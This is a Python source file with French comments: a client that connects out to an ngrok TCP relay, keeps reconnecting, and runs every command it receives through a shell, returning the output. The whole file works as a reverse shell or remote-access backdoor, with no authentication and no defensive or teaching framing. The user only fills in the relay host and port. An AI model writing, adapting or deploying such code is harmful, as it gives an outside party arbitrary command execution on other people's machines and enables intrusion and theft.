import socket
import time
import platform
import subprocess

# -----------------------------
# CONFIGURATION RELAY NGROK
# -----------------------------
RELAY_HOST = "7.tcp.eu.ngrok.io"  # Remplace par ton host Ngrok
RELAY_PORT = 16420                 # Remplace par ton port Ngrok
RECONNECT_DELAY = 5                # secondes entre les tentatives

# -----------------------------
# EXÉCUTION DES COMMANDES
# -----------------------------
def execute_command(cmd):
    """Interprète et exécute les commandes reçues du serveur"""
    cmd = cmd.strip()
    if cmd == "PING":
        return "PONG"
    elif cmd == "INFO":
        return f"Système: {platform.system()} | Machine: {platform.node()}"
    elif cmd == "TIME":
        import time
        return time.ctime()
    elif cmd.startswith("ECHO:"):
        return cmd[5:]
    else:
        try:
            result = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.STDOUT)
            return result
        except Exception as e:
            return f"Erreur commande: {e}"

# -----------------------------
# CONNEXION AU RELAY
# -----------------------------
def connect_to_relay():
    while True:
        try:
            print(f"[INFO] Connexion au relay {RELAY_HOST}:{RELAY_PORT} …")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((RELAY_HOST, RELAY_PORT))
            print("[INFO] Connecté au relay !")
            return s
        except Exception as e:
            print(f"[ERROR] Impossible de se connecter, nouvelle tentative dans {RECONNECT_DELAY}s … {e}")
            time.sleep(RECONNECT_DELAY)

# -----------------------------
# BOUCLE CLIENT
# -----------------------------
def client_loop():
    while True:
        sock = connect_to_relay()
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    print("[INFO] Déconnecté du relay, reconnexion …")
                    break
                cmd = data.decode(errors="ignore")
                print(f"[Commande reçue] {cmd}")
                response = execute_command(cmd)
                sock.send(response.encode())
        except Exception as e:
            print("[ERROR] Connexion perdue :", e)
        finally:
            sock.close()
            time.sleep(RECONNECT_DELAY)

# -----------------------------
# DÉMARRAGE CLIENT
# -----------------------------
if __name__ == "__main__":
    client_loop()
